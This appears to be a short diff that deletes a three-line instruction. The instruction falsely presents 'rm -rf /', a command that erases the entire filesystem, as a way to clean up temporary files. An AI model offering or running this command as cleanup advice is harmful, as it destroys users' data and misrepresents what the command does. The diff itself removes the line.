@@ -1,3 +1,0 @@
-To clean up temporary files, run:
-rm -rf /
-This will remove all files permanently.
